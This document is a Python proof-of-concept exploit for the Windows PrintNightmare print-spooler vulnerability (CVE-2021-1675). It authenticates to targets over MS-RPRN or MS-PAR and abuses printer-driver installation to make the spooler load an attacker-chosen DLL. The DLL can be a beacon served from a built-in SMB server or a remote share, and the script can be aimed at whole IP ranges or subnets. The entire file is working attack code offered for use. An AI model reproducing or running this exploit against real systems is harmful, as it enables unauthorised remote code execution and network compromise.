#!/usr/bin/env python3
# @m8sec
# https://github.com/cube0x0/CVE-2021-1675

import re
import os
import sys
import shutil
import socket
import argparse
import pathlib
import threading
import ipaddress
from sys import exit
from random import choice
from impacket import smbserver
from string import ascii_letters, digits
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.structure import Structure
from impacket.dcerpc.v5 import par, rpcrt, epm
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.dtypes import NULL


############################
# Built-in SMB server
############################
class SMBserver(threading.Thread):
    def __init__(self, share_name, share_path='/tmp/pnm',  listen_address='0.0.0.0', listen_port=445, verbose=False):
        # https://github.com/cube0x0/CVE-2021-1675/issues/36
        self._smb2support = True
        self.share_path = share_path

        try:
            threading.Thread.__init__(self)

            if not os.path.exists(self.share_path):
                os.makedirs(share_path)

            self.server = smbserver.SimpleSMBServer(listen_address, int(listen_port))
            if verbose:
                self.server.setLogFile('')
            self.server.addShare(share_name, share_path, '')
            self.server.setSMB2Support(self._smb2support)
            self.server.setSMBChallenge('')

        except Exception as e:
            errno, message = e.args
            print('[!] Error starting SMB server: {}'.format(message))
            exit(1)

    def run(self):
        try:
            self.server.start()
        except Exception as e:
            pass

    def cleanup_server(self):
        try:
            shutil.rmtree(self._share_path)
        except:
            pass


############################
# Server support func.
############################
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        x = s.getsockname()[0]
        s.close()
        return x
    except:
        print('[!] Unable to get local IP, set manually using "-local-ip".')
        exit(1)


def gen_rand_string(length=6):
    return''.join([choice(ascii_letters + digits) for x in range(length)])


############################
# Parse target inputs
############################
class TargetParser():
    regex = {
        'range': re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}$"),
        'dns': re.compile("^.+\.[a-z|A-Z]{2,}$")
    }

    def __init__(self):
        self.hosts = []

    def parse(self, targets):
        try:
            for t in targets:
                self.controller(t)
            return list(set(self.hosts))
        except Exception as e:
            print('Target Error: {}\n'.format(str(e)))
            sys.exit(1)

    def controller(self, target):
        if target.endswith('.txt'):
            self.fileParser(target)

        elif re.match(self.regex['range'], target):
            self.rangeParser(target)

        elif re.match(self.regex['dns'], target):
            self.hosts.append(target)

        elif ',' in target:
            self.multiParser(target)

        elif target[-2] == '/' or target[-3] == '/':
            for ip in ipaddress.ip_network(target, strict=False):
                self.hosts.append(ip)

        elif self.ipParser(target):
            self.hosts.append(target)

    def ipParser(self, ip):
        try:
            # Return True on valid IPv4/IPv6 address
            return ipaddress.ip_address(ip)
        except:
            return False

    def fileParser(self, filename):
        with open(filename, 'r') as f:
            for line in f:
                self.controller(line.strip())

    def multiParser(self, target):
        for t in target.strip().split(','):
            self.controller(t)

    def rangeParser(self, target):
        a = target.split("-")
        b = a[0].split(".")
        for x in range(int(b[3]), int(a[1]) + 1):
            tmp = b[0] + "." + b[1] + "." + b[2] + "." + str(x)
            self.hosts.append(tmp)


############################
# Driver classes
############################
class DRIVER_INFO_2_BLOB(Structure):
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
    structure = (
        ('cVersion', '<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset'] + offset:self['DataFileOffset'] + offset].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset'] + offset:self['DriverPathOffset'] + offset].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset'] + offset:self['EnvironmentOffset'] + offset].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset'] + offset:self['NameOffset'] + offset].decode('utf-16-le')
        self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')


class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data=None, pcReturned=None):
        Structure.__init__(self, data=data)
        self['drivers'] = list()
        remaining = data
        if data is not None:
            for i in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self['drivers'].append(attr)
                remaining = remaining[len(attr):]


############################
# MS-PAR Exploit Class
############################
class MSPAR:
    @staticmethod
    def connect(username, password, domain, lmhash, nthash, address, port, timeout=5):
        stringbinding = epm.hept_map(address, par.MSRPC_UUID_PAR, protocol='ncacn_ip_tcp')
        rpctransport = DCERPCTransportFactory(stringbinding)

        rpctransport.set_connect_timeout(timeout)
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)

        print("[*] Connecting to {0}".format(stringbinding))
        try:
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(par.MSRPC_UUID_PAR, transfer_syntax=('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))
        except:
            print('[-] Connection failed')
            return False

        print('[+] Bind OK')
        return dce

    @staticmethod
    def getDriver(dce, handle=NULL):
        resp = par.hRpcAsyncEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
        blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
        for i in blobs['drivers']:
            if "filerepository" in i['DriverPathArray'].lower():
                return i
        print("[-] Failed to find driver")
        sys.exit(1)

    @staticmethod
    def exploit(dce, pDriverPath, share, handle=NULL):
        # build DRIVER_CONTAINER package
        container_info = rprn.DRIVER_CONTAINER()
        container_info['Level'] = 2
        container_info['DriverInfo']['tag'] = 2
        container_info['DriverInfo']['Level2']['cVersion'] = 3
        container_info['DriverInfo']['Level2']['pName'] = "1234\x00"
        container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
        container_info['DriverInfo']['Level2']['pDriverPath'] = pDriverPath + '\x00'
        container_info['DriverInfo']['Level2']['pDataFile'] = "{0}\x00".format(share)
        container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\winhttp.dll\x00"

        flags = par.APD_COPY_ALL_FILES | 0x10 | 0x8000
        filename = share.split("\\")[-1]

        resp = par.hRpcAsyncAddPrinterDriver(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
        print("[*] Stage0: {0}".format(resp['ErrorCode']))

        container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
        for i in range(1, 30):
            try:
                container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
                resp = par.hRpcAsyncAddPrinterDriver(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
                print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
                if (resp['ErrorCode'] == 0):
                    print("[+] Exploit Completed")
                    return
            except Exception as e:
                pass


############################
# MS-RPRN Exploit Class
############################
class MSRPRN:
    @staticmethod
    def connect(username, password, domain, lmhash, nthash, address, port, timeout=5):
        binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
        rpctransport = transport.DCERPCTransportFactory(binding)

        rpctransport.set_connect_timeout(timeout)
        rpctransport.set_dport(port)
        rpctransport.setRemoteHost(address)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(username, password, domain, lmhash, nthash)

        print("[*] Connecting to {0}".format(binding))
        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
        except:
            print('[-] Connection failed')
            return False

        print('[+] Bind OK')
        return dce

    @staticmethod
    def getDriver(dce, handle=NULL):
        resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
        blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
        for i in blobs['drivers']:
            if "filerepository" in i['DriverPathArray'].lower():
                return i
        print("[-] Failed to find driver")
        sys.exit(1)

    @staticmethod
    def exploit(dce, pDriverPath, share, handle=NULL):
        # build DRIVER_CONTAINER package
        container_info = rprn.DRIVER_CONTAINER()
        container_info['Level'] = 2
        container_info['DriverInfo']['tag'] = 2
        container_info['DriverInfo']['Level2']['cVersion'] = 3
        container_info['DriverInfo']['Level2']['pName'] = "1234\x00"
        container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
        container_info['DriverInfo']['Level2']['pDriverPath'] = pDriverPath + '\x00'
        container_info['DriverInfo']['Level2']['pDataFile'] = "{0}\x00".format(share)
        container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\winhttp.dll\x00"

        flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
        filename = share.split("\\")[-1]

        resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
        print("[*] Stage0: {0}".format(resp['ErrorCode']))

        container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
        for i in range(1, 30):
            try:
                container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
                resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
                print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
                if (resp['ErrorCode'] == 0):
                    print("[+] Exploit Completed")
                    return
            except Exception as e:
                pass


############################
# Main & Entry Point
############################
def main(target, dll_payload, args):
    domain = target if args.local_auth else args.domain
    proto = MSPAR if args.proto == 'MS-PAR' else MSRPRN
    dce = proto.connect(args.username, args.password, domain, args.lmhash, args.nthash, target, args.port, args.timeout)
    if not dce: return
    handle = NULL

    # find "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL" path
    if not args.pDriverPath:
        try:
            blob = proto.getDriver(dce, handle)
            pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\UNIDRV.DLL'

            if not "FileRepository" in pDriverPath:
                print("[-] pDriverPath {0}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....".format(pDriverPath))
                print("[-] Specify pDriverPath manually")
                sys.exit(1)

        except Exception as e:
            print('[-] Failed enumerating remote pDriverPath: {}'.format(e))
            sys.exit(1)
    else:
        pDriverPath = args.pDriverPath

    if "\\\\" in dll_payload:
        dll_payload = dll_payload.replace("\\\\", "\\??\\UNC\\")

    print("[+] pDriverPath Found {0}".format(pDriverPath))
    print("[*] Executing {0}".format(dll_payload))

    # re-run if stage0/stageX fails
    print("[*] Try 1...")
    proto.exploit(dce, pDriverPath, dll_payload)
    print("[*] Try 2...")
    proto.exploit(dce, pDriverPath, dll_payload)
    print("[*] Try 3...")
    proto.exploit(dce, pDriverPath, dll_payload)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="PrintNightmare Exploit", formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
    parser.add_argument('-v', dest='verbose', action='store_true', help='Enable verbose logging from SMB server')
    parser.add_argument('-t', dest='timeout', type=int, default=5, help='Connection timeout')\

    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('-u', dest='username', type=str, default='', help='Set username')

    auth_pwd = auth_group.add_mutually_exclusive_group(required=False)
    auth_pwd.add_argument('-H', '-hashes', dest='hash', type=str, default='', help='Use Hash for authentication')
    auth_pwd.add_argument('-p', dest='password', type=str, default='', help='Set password')

    auth_domain = auth_group.add_mutually_exclusive_group(required=True)
    auth_domain.add_argument('-d', dest='domain', type=str, default='', help='Set domain')
    auth_domain.add_argument('--local-auth', action='store_true', help='Authenticate to target host, no domain')
    auth_group.add_argument('-lmhash', action='store', default='', help=argparse.SUPPRESS)
    auth_group.add_argument('-nthash', action='store', default='', help=argparse.SUPPRESS)

    dll_group = parser.add_argument_group('DLL Execution')
    dll_file = dll_group.add_mutually_exclusive_group(required=True)
    dll_file.add_argument('-dll', dest='dll', type=str, default='', help='Local DLL file to execute')
    dll_file.add_argument('--remote-dll', type=str, default='', help='Remote dll "\\\\192.168.1.25\\Share\\beacon.dll"')
    dll_group.add_argument('-share', type=str, default=gen_rand_string(), help='Set local SMB share name')
    dll_group.add_argument('--local-ip', type=str, default=get_local_ip(), help='Set local IP (defaults to primary interface)')

    target_group = parser.add_argument_group('Target(s)')
    target_group.add_argument('-pDriverPath', action='store', help='Driver path. Example \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'',)

    target_group.add_argument(dest='target', nargs='*', help='192.168.2.2, target.txt, 10.0.0.0/24')
    target_group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port", help='Destination port to connect to SMB Server')
    target_group.add_argument('-proto', choices=['MS-RPRN', 'MS-PAR'], type=str, default='MS-RPRN', help="Target protocol (Default=MS-RPRN)")

    args = parser.parse_args()
    print('[*] starting PrintNightmare PoC')

    # Setup password / hash values
    if args.hash:
        try:
            lmhash, nthash = args.hash.split(':')
        except:
            nthash = args.hash
        setattr('args', 'lmhash', lmhash)
        setattr('args', 'nthash', nthash)
        setattr('args', 'password', '')

    # Setup DLL & Local SMB Server
    if args.remote_dll:
        dll = args.remote_dll
        print('[*] Using remote payload at {}'.format(dll))
    elif os.path.exists(args.dll):
        smb = SMBserver(args.share, verbose=args.verbose)
        smb.daemon = True
        smb.start()

        shutil.copy(args.dll, smb.share_path)
        if os.path.exists(os.path.join(smb.share_path, os.path.basename(args.dll))):
            dll = '\\\\{}\\{}\\{}'.format(args.local_ip, args.share, os.path.basename(args.dll))
            print('[+] Self-hosted payload at {}'.format(dll))
        else:
            print('[!] Unable to copy target DLL.')
            exit(1)
    else:
        print('[!] Local DLL not found.')
        exit(1)

    # Execute
    for target in TargetParser().parse(args.target):
        try:
            print('\n[*] Attempting target: {}'.format(target))
            main(target, dll, args)
        except Exception as e:
            print('[-] Exploit returned: {}'.format(e))

    # Cleanup
    if 'smb' in locals():
        print('[*] Closing SMB Server')
        smb.cleanup_server()
